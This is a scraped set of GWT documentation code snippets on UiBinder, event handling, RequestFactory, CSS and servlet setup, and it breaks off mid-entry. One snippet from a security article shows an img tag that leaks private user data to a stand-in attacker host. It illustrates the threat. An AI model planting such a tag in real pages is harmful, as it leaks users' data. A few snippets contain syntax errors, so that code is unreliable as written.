https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\n@UiHandler(\"confirmAddButton\")\nprotected void onConfirmAddButtonClick(ClickEvent e) {\n  if (!titleInput.getValue().isEmpty()) {\n    addItem(titleInput.getValue(), descriptionInput.getValue());\n    // clear text fields\n    titleInput.setValue(\"\");\n    descriptionInput.setValue(\"\");\n  }\n}\n\nprivate void addItem(String title, String description) {\n  Item item = new Item();\n  item.setTitle(title);\n  item.setDescription(description);\n  content.add(item);\n}\n```\n\n----------------------------------------\n\nTITLE: Java Collection Classes and Methods Documentation\nDESCRIPTION: Detailed documentation of various utility classes from java.util package including Comparator, Date, Collections, Maps, Sets and their associated methods. This represents the public API available in Java 11.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\n/* Example class signatures and methods\n\nComparator:\ncompare(T, T)\ncomparing(Function)\nthenComparing(Function)\n\nHashMap:\nHashMap()\nHashMap(int initialCapacity)\nHashMap(int initialCapacity, float loadFactor)\n\nLinkedList:\nLinkedList()\nLinkedList(Collection c)\nadd(E element)\naddFirst(E element)\naddLast(E element)\n*/\n\n```\n\n----------------------------------------\n\nTITLE: Adding Ripple Effect to Menu Items\nDESCRIPTION: Enhances the UiBinder XML template by adding PaperRipple components to menu items and CSS styling. This creates a Material Design responsive interaction effect when users click menu items.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n     xmlns:g='urn:import:com.google.gwt.user.client.ui'\n     xmlns:p='urn:import:com.vaadin.polymer.paper.widget'\n     xmlns:i='urn:import:com.vaadin.polymer.iron.widget'>\n\n    <ui:style>\n      paper-icon-item {\n        position: relative;\n        overflow: hidden;\n      }\n    </ui:style>\n\n    <g:HTMLPanel>\n      <p:PaperIconItem ui:field=\"menuClearAll\">\n        <i:IronIcon icon=\"delete\" attributes=\"item-icon\"/>\n        <div>Clear All</div>\n        <p:PaperRipple/>\n      </p:PaperIconItem>\n      <p:PaperIconItem ui:field=\"menuClearDone\">\n        <i:IronIcon icon=\"clear\" attributes=\"item-icon\"/>\n        <div>Clear Done</div>\n        <p:PaperRipple/>\n      </p:PaperIconItem>\n      <p:PaperIconItem ui:field=\"menuSettings\">\n        <i:IronIcon icon=\"settings\" attributes=\"item-icon\"/>\n        <div>Settings</div>\n        <p:PaperRipple/>\n      </p:PaperIconItem>\n      <p:PaperIconItem ui:field=\"menuAbout\">\n        <i:IronIcon icon=\"help\" attributes=\"item-icon\"/>\n        <div>About</div>\n        <p:PaperRipple/>\n      </p:PaperIconItem>\n    </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Panel Layout with UiBinder in GWT\nDESCRIPTION: Demonstrates how to use a HorizontalPanel in a UiBinder template to arrange Label widgets horizontally.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n    xmlns:g='urn:import:com.google.gwt.user.client.ui'>\n\n  <g:HorizontalPanel>\n    <g:Label>Keep your ducks</g:Label>\n    <g:Label>in a row</g:Label>\n  </g:HorizontalPanel>\n\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Aligning DockPanel Content with Cell Alignment in GWT\nDESCRIPTION: This code demonstrates how to properly align widgets within a DockPanel by using cell alignment settings. It specifically aligns a button to the right side of the EAST cell.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nButton rightButton = new Button(\"rightButton\");\n    dockPanel.add(rightButton, DockPanel.EAST);\n    dockPanel.setCellHorizontalAlignment(rightButton, HasHorizontalAlignment.ALIGN_RIGHT);\n```\n\n----------------------------------------\n\nTITLE: Conditional GWT Script Loading Based on Authentication\nDESCRIPTION: This servlet example uses App Engine's UserService to check if a user is logged in, serving the GWT module script only to authenticated users. It also adds appropriate login/logout links depending on the user's state.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/dynamic_host_page.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n// In GwtHostingServlet's doGet() method...\nPrintWriter writer = resp.getWriter();\nwriter.append(\"<html><head>\");\n\nUserService userService = UserServiceFactory.getUserService();\nif (userService.isUserLoggedIn()) {\n  // Add a <script> tag to serve your app's generated JS code\n  writer.append(\"<script type=\\\"text/javascript\\\" src=\\\"sample/sample.nocache.js\\\"></script>\");\n  writer.append(\"</head><body>\");\n  // Add a link to log out\n  writer.append(\"<a href=\\\"\" + userService.createLogoutURL(\"/\") + \"\\\">Log out</a>\");\n} else {\n  writer.append(\"</head><body>\");\n  // Add a link to log in\n  writer.append(\"<a href=\\\"\" + userService.createLoginURL(\"/\") + \"\\\">Log in</a>\");\n}\nwriter.append(\"</body></html>\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Stock Table Update Methods\nDESCRIPTION: Methods to update the stock table with new price data and formatting\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_13\n\nLANGUAGE: java\nCODE:\n```\nprivate void updateTable(StockPrice[] prices) {\n  for (int i = 0; i < prices.length; i++) {\n    updateTable(prices[i]);\n  }\n}\n\nprivate void updateTable(StockPrice price) {\n  if (!stocks.contains(price.getSymbol())) {\n    return;\n  }\n\n  int row = stocks.indexOf(price.getSymbol()) + 1;\n\n  String priceText = NumberFormat.getFormat(\"#,##0.00\").format(\n         price.getPrice());\n  NumberFormat changeFormat = NumberFormat.getFormat(\"+#,##0.00;-#,##0.00\");\n  String changeText = changeFormat.format(price.getChange());\n  String changePercentText = changeFormat.format(price.getChangePercent());\n\n  stocksFlexTable.setText(row, 1, priceText);\n  stocksFlexTable.setText(row, 2, changeText + \" (\" + changePercentText\n     + \"%)\");\n}\n```\n\n----------------------------------------\n\nTITLE: Defining and Accessing Inline Styles in UiBinder Templates\nDESCRIPTION: Example demonstrating how to define CSS styles in a UiBinder template and access them programmatically through a Java interface. Shows how to toggle styles based on a widget's enabled state.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_22\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n\n  <ui:style type='com.my.app.MyFoo.MyStyle'>\n    .redBox { background-color:pink; border: 1px solid red; }\n    .enabled { color:black; }\n    .disabled { color:gray; }\n  </ui:style>\n\n  <div class='{style.redBox} {style.enabled}'>I'm a red box widget.</div>\n\n</ui:UiBinder>\n```\n\nLANGUAGE: java\nCODE:\n```\npublic class MyFoo extends Widget {\n  interface MyStyle extends CssResource {\n    String enabled();\n    String disabled();\n  }\n\n  @UiField MyStyle style;\n\n  /* ... */\n\n  void setEnabled(boolean enabled) {\n    getElement().addClassName(enabled ? style.enabled() : style.disabled());\n    getElement().removeClassName(enabled ? style.disabled() : style.enabled());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Programmatic UI Implementation in ContactsView\nDESCRIPTION: Original implementation of the ContactsView constructor that creates the UI programmatically, setting up DecoratorPanel, FlexTable, and button controls without UiBinder.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsView extends Composite implements ContactsPresenter.Display {\n  ...\n  public ContactsView() {\n    DecoratorPanel contentTableDecorator = new DecoratorPanel();\n    initWidget(contentTableDecorator);\n    contentTableDecorator.setWidth(\"100%\");\n    contentTableDecorator.setWidth(\"18em\");\n    contentTable = new FlexTable();\n    contentTable.setWidth(\"100%\");\n    contentTable.getCellFormatter().addStyleName(0, 0, \"contacts-ListContainer\");\n    contentTable.getCellFormatter().setWidth(0, 0, \"100%\");\n    contentTable.getFlexCellFormatter().setVerticalAlignment(0, 0, DockPanel.ALIGN_TOP);\n\n    // Create the menu\n    //\n    HorizontalPanel hPanel = new HorizontalPanel();\n    hPanel.setBorderWidth(0);\n    hPanel.setSpacing(0);\n    hPanel.setHorizontalAlignment(HorizontalPanel.ALIGN_LEFT);\n    addButton = new Button(\"Add\");\n    hPanel.add(addButton);\n    deleteButton = new Button(\"Delete\");\n    hPanel.add(deleteButton);\n    contentTable.getCellFormatter().addStyleName(0, 0, \"contacts-ListMenu\");\n    contentTable.setWidget(0, 0, hPanel);\n\n    // Create the contacts list\n    //\n    contactsTable = new FlexTable();\n    contactsTable.setCellSpacing(0);\n    contactsTable.setCellPadding(0);\n    contactsTable.setWidth(\"100%\");\n    contactsTable.addStyleName(\"contacts-ListContents\");\n    contactsTable.getColumnFormatter().setWidth(0, \"15px\");\n    contentTable.setWidget(1, 0, contactsTable);\n    contentTableDecorator.add(contentTable);\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an EntityProxy Interface for Employee Entity in GWT RequestFactory\nDESCRIPTION: Client-side EntityProxy interface that corresponds to a server-side Employee entity. It defines getters and setters for the properties that should be exposed to the client and uses @ProxyFor annotation to reference the server-side entity.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n@ProxyFor(Employee.class)\npublic interface EmployeeProxy extends EntityProxy {\n\n  String getDepartment();\n\n  String getDisplayName();\n\n  Long getId();\n\n  String getPassword();\n\n  EmployeeProxy getSupervisor();\n\n  String getUserName();\n\n  void setDepartment(String department);\n\n  void setDisplayName(String displayName);\n\n  void setPassword(String password);\n\n  void setSupervisor(EmployeeProxy supervisor);\n\n  void setUserName(String userName);\n}\n```\n\n----------------------------------------\n\nTITLE: Including External JavaScript in GWT Module\nDESCRIPTION: Syntax for including external JavaScript files in a GWT module, which will be loaded before the module's entry point is called.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"_js-url_\"/>\n```\n\n----------------------------------------\n\nTITLE: Implementing Shared Click Handler for Multiple GWT Buttons\nDESCRIPTION: An implementation of a shared click handler pattern to improve performance when handling events from many widgets. This technique reduces the number of handler instances by using a single handler for multiple buttons and tracking context with a HashMap.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nclass MyApp implements EntryPoint, ClickHandler {\n\n   /* Be careful with saving UI components in datastructures like this:\n    * if you remove a button from the app, make sure you also remove\n    * its reference from buttonMap HashMap to avoid memory leaks.\n    */\n   Map buttonMap<Button, Integer> = new HashMap<Button,Integer>();\n\n   public void onModuleLoad() {\n     FlowPanel panel = new FlowPanel();\n     for (int i = 1; i < 100; ++i) {\n        Button newButton = new Button(\"Option \" + i);\n        newButton.addClickHandler(this);\n        panel.add(newButton);\n        buttonmap.add(newButton, Integer.valueOf(i));\n     }\n     RootPanel.get().add(panel);\n   }\n\n   // The shared ClickHandler code.\n   public void onClick(ClickEvent event) {\n     Object sender = event.getSource();\n     if (sender instanceof Button) {\n       Button b = (Button) sender;\n       Integer context = buttonMap.get(b);\n       if (context != null) {\n         // ... Handle the button click for this button.\n       }\n     }\n   }\n }\n```\n\n----------------------------------------\n\nTITLE: Implementing JSONP Client in GWT\nDESCRIPTION: A GWT Java class that implements a JSONP client to fetch and process data from a Google Base feed. It includes methods for script tag management, callback reservation, and JSON data handling.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_for_json_mashups.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic class Hax0r implements EntryPoint {\n  protected HashMap scriptTags = new HashMap();\n  protected HashMap callbacks = new HashMap();\n  protected int curIndex = 0;\n\n  public native static void setup(Hax0r h, String callback) /*-{\n    $wnd[callback] = function(someData) {\n      h.@com.google.gwt.hax0r.client.Hax0r::handle(Lcom/google/gwt/core/client/JavaScriptObject;)(someData);\n    }\n  }-*/;\n\n  public String reserveCallback() {\n    while (true) {\n      if (!callbacks.containsKey(new Integer(curIndex))) {\n        callbacks.put(new Integer(curIndex), null);\n        return \"__gwt_callback\" + curIndex++;\n      }\n    }\n  }\n\n  public void addScript(String uniqueId, String url) {\n    Element e = DOM.createElement(\"script\");\n    DOM.setAttribute(e, \"language\", \"JavaScript\");\n    DOM.setAttribute(e, \"src\", url);\n    scriptTags.put(uniqueId, e);\n    DOM.appendChild(RootPanel.get().getElement(), e);\n  }\n\n  public void onModuleLoad() {\n    String gdata = \"http://www.google.com/base/feeds/snippets?alt=json-in-script&callback=\";\n    String callbackName = reserveCallback();\n    setup(this, callbackName);\n    addScript(callbackName, gdata + callbackName);\n  }\n\n  public void handle(JavaScriptObject jso) {\n    JSONObject json = new JSONObject(jso);\n    JSONArray ary = json.get(\"feed\").isObject().get(\"entry\").isArray();\n    for (int i = 0; i < ary.size(); ++i) {\n      RootPanel.get().add(new Label(ary.get(i).isObject().get(\"title\").isObject().get(\"$t\").toString()));\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Styling Polymer Components in GWT UiBinder with CSS\nDESCRIPTION: This snippet demonstrates how to style Polymer components within a UiBinder file using standard CSS. It customizes the toolbar color, header text, and content panel appearance by including CSS directly in the HTMLPanel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-buildui.md#2025-04-09_snippet_9\n\nLANGUAGE: XML\nCODE:\n```\n<g:HTMLPanel>\n    <style>\n      .toolbar {\n        background: #4285f4 !important;\n       }\n      .header {\n        font-size: 200%;\n        margin-left: 50px;\n        background: #4285f4 !important;\n       }\n      .content {\n        padding: 15px;\n       }\n       ...\n    </style>\n    ...\n    <div main=\"\">\n        <paper-header-panel mode=\"seamed\">\n            <paper-toolbar class=\"toolbar\">\n                <paper-icon-button ui:field=\"menu\" icon=\"more-vert\" paper-drawer-toggle=\"\"/>\n                <span class=\"header\">Todo List</span>\n            </paper-toolbar>\n            <div ui:field=\"content\" class=\"content vertical center-justified layout\"/>\n        </paper-header-panel>\n    </div>\n   ...\n</g:HTMLPanel>\n```\n\n----------------------------------------\n\nTITLE: CSS to GSS Conversion with Scope\nDESCRIPTION: Command line example for running the CSS to GSS conversion tool with scope parameter for handling dependencies.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gss_migration.md#2025-04-09_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\njava -cp gwt-user.jar com.google.gwt.resources.converter.Css2Gss -scope foo.css,bar.css fileToConvert.css\n```\n\n----------------------------------------\n\nTITLE: Adjusting Panel Width in GWT for Full-Width Layout\nDESCRIPTION: Code modification to set a panel's width to 100% to ensure it fills the available horizontal space, solving a common layout issue where inner panels expand but outer ones don't.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_UI.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nvertPanel.setWidth(\"100%\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Shared ClickHandler for Multiple Buttons in GWT\nDESCRIPTION: This example shows how to implement a shared ClickHandler for multiple Button widgets in GWT. It demonstrates a more memory-efficient approach by using a single handler instance and distinguishing between event sources using the getSource() method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiHandlers.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\npublic class HandlerExample extends Composite implements ClickHandler {\n  private FlowPanel fp = new FlowPanel();\n  private Button b1 = new Button(\"Button 1\");\n  private Button b2 = new Button(\"Button 2\");\n\n  public HandlerExample() {\n    initWidget(fp);\n    fp.add(b1);\n    fp.add(b2);\n    b1.addClickHandler(this);\n    b2.addClickHandler(this);\n  }\n\n  public void onClick(ClickEvent event) {\n    // note that in general, events can have sources that are not Widgets.\n    Widget sender = (Widget) event.getSource();\n\n    if (sender == b1) {\n      // handle b1 being clicked\n    } else if (sender == b2) {\n      // handle b2 being clicked\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Conditional Compilation Example in GWT\nDESCRIPTION: Shows how to use GWT's conditional CSS with deferred-binding properties to generate optimized CSS for different browser permutations. This allows better optimization than runtime conditional evaluation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_30\n\nLANGUAGE: css\nCODE:\n```\n.a {\n  background: red;\n}\n\n@if user.agent safari {\n  .a {\n    \\-webkit-border-radius: 5px;\n  }\n} @else {\n  .a {\n    background: url('picture_of_border.png');\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: UiBinder Implementation of ContactsViewImpl\nDESCRIPTION: The simplified Java class that uses UiBinder to create the UI, replacing the programmatic construction with UiBinder's declarative approach. Fields are accessed via @UiField annotations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n  ...\n  @UiTemplate(\"ContactsView.ui.xml\")\n  interface ContactsViewUiBinder extends UiBinder<Widget, ContactsViewImpl> {}\n  private static ContactsViewUiBinder uiBinder =\n    GWT.create(ContactsViewUiBinder.class);\n\n  @UiField FlexTable contactsTable;\n  @UiField Button addButton;\n  @UiField Button deleteButton;\n\n  public ContactsViewImpl() {\n    initWidget(uiBinder.createAndBindUi(this));\n  }\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ValueProxy and EntityProxy Interfaces for Person and Address in GWT\nDESCRIPTION: Client-side proxy interfaces for Person and Address. AddressProxy extends ValueProxy for embedded objects without their own identity, while PersonProxy extends EntityProxy and references the Address through its proxy interface.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic interface AddressProxy extends ValueProxy {\n  public String getStreet1();\n  public String getStreet2();\n  public String getCity();\n  public String getSt();\n  public String getZip();\n  ...\n}\n\npublic interface PersonProxy extends EntityProxy {\n  Long getId();\n  Integer getVersion();\n  String getFirstName();\n  String getLastName();\n  AddressProxy getAddress();\n   ...\n}\n```\n\n----------------------------------------\n\nTITLE: Exact Value in Properties File (Properties)\nDESCRIPTION: Example of defining an exact value match for zero items in a properties file. It demonstrates the use of escaped equals sign for the '=0' case.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_4\n\nLANGUAGE: properties\nCODE:\n```\ncartItems[\\=0]=Your cart is empty.\n```\n\n----------------------------------------\n\nTITLE: Path Annotation Usage in GWT Editors\nDESCRIPTION: Shows how to use the @Path annotation to specify nested property paths in editors.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiEditors.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass PersonEditor implements Editor<Person> {\n  // Corresponds to person.getManager().getName()\n  @Path(\"manager.name\");\n  Label managerName;\n}\n```\n\n----------------------------------------\n\nTITLE: Using NumberFormat in GWT\nDESCRIPTION: Demonstrates the import statement for NumberFormat in GWT, which offers a subset of functionality similar to java.util.NumberFormat for number formatting.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsCompatibility.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nimport com.google.gwt.i18n.client.NumberFormat;\n```\n\n----------------------------------------\n\nTITLE: Generic Contacts View Implementation in GWT\nDESCRIPTION: View implementation showing column definition setup with generics.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsViewImpl<T> extends Composite implements ContactsView<T> {\n    ...\n    private List<ColumnDefinition<T>> columnDefinitions;\n    public void setColumnDefinitions(\n        List<ColumnDefinition<T>> columnDefinitions) {\n      this.columnDefinitions = columnDefinitions;\n    }\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Validating Stock Code Input in Java with GWT\nDESCRIPTION: This snippet demonstrates how to validate user input for a stock code in a GWT application. It checks if the input matches a specific pattern using regular expressions, displays an alert for invalid input, and clears the input field for valid entries.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/manageevents.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nprivate void addStock() {\n  final String symbol = newSymbolTextBox.getText().toUpperCase().trim();\n  newSymbolTextBox.setFocus(true);\n\n  // Stock code must be between 1 and 10 chars that are numbers, letters, or dots.\n  if (!symbol.matches(\"^[0-9A-Z\\\\.]{1,10}$\")) {\n    Window.alert(\"'\" + symbol + \"' is not a valid symbol.\");\n    newSymbolTextBox.selectAll();\n    return;\n  }\n\n  newSymbolTextBox.setText(\"\");\n      \n  // TODO Don't add the stock if it's already in the table.\n  // TODO Add the stock to the table\n  // TODO Add a button to remove this stock from the table.\n  // TODO Get the stock price.\n}\n```\n\n----------------------------------------\n\nTITLE: Malicious Image Tag Example\nDESCRIPTION: Shows how an attacker could use an image tag to leak sensitive data through URL parameters.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/security_for_gwt_applications.md#2025-04-09_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<img src=\"http://evil.domain.tld/pagehits?private_user_data=12345\"/>\n```\n\n----------------------------------------\n\nTITLE: Capturing Keyboard Events using DOM in GWT\nDESCRIPTION: This example demonstrates how to use DOM methods to capture keyboard events for specific elements and handle them before event dispatch in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiDom.md#2025-04-09_snippet_3\n\nLANGUAGE: Java\nCODE:\n```\nprivate ArrayList<Element> keyboardEventReceivers = new ArrayList<Element>();\n\n/**\n * Widgets can register their DOM element object if they would like to be a\n * trigger to intercept keyboard events\n */\npublic void registerForKeyboardEvents(Element e) {\n  this.keyboardEventReceivers.add(e);\n}\n\n/**\n * Returns true if this is one of the keys we are interested in\n */\npublic boolean isInterestingKeycode(int keycode) {\n  // ...\n  return false;\n}\n\n/**\n * Setup the event preview class when the module is loaded.\n */\nprivate void setupKeyboardShortcuts() {\n  // Define an inner class to handle the event\n  Event.addNativePreviewHandler(new NativePreviewHandler() {\n    public void onPreviewNativeEvent(NativePreviewEvent preview) {\n      NativeEvent event = preview.getNativeEvent();\n\n      Element elt = event.getEventTarget().cast();\n      int keycode = event.getKeyCode();\n      boolean ctrl = event.getCtrlKey();\n      boolean shift = event.getShiftKey();\n      boolean alt = event.getAltKey();\n      boolean meta = event.getMetaKey();\n      if (event.getType().equalsIgnoreCase(\"keypress\") || ctrl || shift\n          || alt || meta || keyboardEventReceivers.contains(elt)\n          || !isInterestingKeycode(keycode)) {\n        // Tell the event handler to continue processing this event.\n        return;\n      }\n\n      GWT.log(\"Processing Keycode\" + keycode, null);\n      handleKeycode(keycode);\n\n      // Tell the event handler that this event has been consumed\n      preview.consume();\n    }\n  });\n}\n\n/**\n * Perform the keycode specific processing\n */\nprivate void handleKeycode(int keycode) {\n  switch (keycode) {\n  // ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a ResizeComposite in GWT\nDESCRIPTION: This Java code shows how to implement a Composite that requires resize functionality by extending ResizeComposite instead of regular Composite. It ensures that onResize() is called correctly for wrapped widgets.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\nclass MyWidget extends ResizeComposite {\n  private LayoutPanel p = new LayoutPanel();\n\n  public MyWidget() {\n    initWidget(p);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Web Application Deployment Descriptor for GWT StockWatcher\nDESCRIPTION: Defines the web.xml deployment descriptor for the StockWatcher application, including servlet mappings for login and stock services.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_25\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<web-app>\n\n  <!-- Default page to serve -->\n  <welcome-file-list>\n    <welcome-file>StockWatcher.html</welcome-file>\n  </welcome-file-list>\n\n  <!-- Servlets -->\n  <servlet>\n    <servlet-name>loginService</servlet-name>\n    <servlet-class>com.google.gwt.sample.stockwatcher.server.LoginServiceImpl</servlet-class>\n  </servlet>\n\n  <servlet>\n    <servlet-name>stockService</servlet-name>\n    <servlet-class>com.google.gwt.sample.stockwatcher.server.StockServiceImpl</servlet-class>\n  </servlet>\n\n  <servlet-mapping>\n    <servlet-name>loginService</servlet-name>\n    <url-pattern>/stockwatcher/login</url-pattern>\n  </servlet-mapping>\n\n  <servlet-mapping>\n    <servlet-name>stockService</servlet-name>\n    <url-pattern>/stockwatcher/stock</url-pattern>\n  </servlet-mapping>\n\n</web-app>\n```\n\n----------------------------------------\n\nTITLE: Implementing Persistent Account Entity with Gilead\nDESCRIPTION: Account class implementation that extends LightEntity for Gilead integration and implements Serializable for GWT RPC support.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_25\n\nLANGUAGE: java\nCODE:\n```\nimport net.sf.gilead.pojo.java5.LightEntity;\n\npublic class Account extends LightEntity implements Serializable {\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Rewriting External Links using DOM in GWT\nDESCRIPTION: This code iterates through anchor tags and rewrites links that point outside the site to a 'blocked' page. It demonstrates DOM element manipulation in GWT.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiDom.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Find all anchor tags and if any point outside the site, \n * redirect them to a \"blocked\" page.\n */\n private void rewriteLinksIterative() {\n   ArrayList<String> links = new ArrayList<String>();\n   putElementLinkIDsInList(this.getElement(), links);\n   for (int i = 0; i < links.size(); i++) {\n     Element elt = Document.get().getElementById(links.get(i));\n     rewriteLink(elt, \"www.example.com\");\n   }\n }\n\n/**\n * Block all accesses out of the website that don't match 'sitename'\n * @param element An anchor link element\n * @param sitename name of the website to check.  e.g. \"www.example.com\"\n */\nprivate void rewriteLink(Element element, sitename) {\n  String href = element.getPropertyString(\"href\");\n  if (null == href) {\n    return;\n  }\n\n  // We want to re-write absolute URLs that go outside of this site\n  if (href.startsWith(\"http://\") && \n      !href.startsWith(\"http://\"+sitename+\"/\") {\n    element.setPropertyString(\"href\", \"http://\"+sitename+\"/Blocked.html\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT MeetingViewWidget\nDESCRIPTION: This snippet shows the implementation of the MeetingViewWidget class, which is the concrete view implementation in GWT. It sets up the UI components and event listeners.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/testing_methodologies_using_gwt.md#2025-04-09_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\npublic class MeetingViewWidget extends Composite implements MeetingView {\n  private Button saveButton = new Button(\"Save\");\n  private TextBox capacityText = new TextBox();\n\n  public MeetingViewWidget() {\n    VerticalPanel mainPanel = new VerticalPanel();\n\n    HorizontalPanel row = new HorizontalPanel();\n    row.add(new Label(\"Capacity:\"));\n    row.add(capacityText);\n\n    mainPanel.add(row);\n    mainPanel.add(saveButton);\n\n    // Start with the save button disabled\n    saveButton.setEnabled(false);\n\n    // Here the view is responsible for creating the model and presenter\n    final Presenter presenter = new Presenter(new Meeting(), this, new RemoteRoomScheduler());\n    capacityText.addChangeListener(new ChangeListener() {\n      public void onChange(Widget sender) {\n        presenter.requiredCapacityChanged((HasText) sender);\n      }\n    });\n\n    initWidget(mainPanel);\n  }\n\n  public void disableSaveButton() {\n    saveButton.setEnabled(false);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Dozer to Map Hibernate Entities to DTOs in Java\nDESCRIPTION: Example of how to use the Dozer API to map Hibernate entities to DTOs in Java code. The DozerBeanMapperSingletonWrapper is used to perform the mapping operation, converting the Hibernate entities to serializable DTOs.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_23\n\nLANGUAGE: java\nCODE:\n```\nDozerBeanMapperSingletonWrapper.getInstance().map(account, AccountDTO.class));\n// or\nDozerBeanMapperSingletonWrapper.getInstance().map(record, RecordDTO.class));\n\n```\n\n----------------------------------------\n\nTITLE: Apache Proxy Permissions Configuration\nDESCRIPTION: Apache configuration block to set proxy permissions, allowing access to proxied services. This is required to prevent 403 permission errors when accessing proxied services.\nSOURCE: 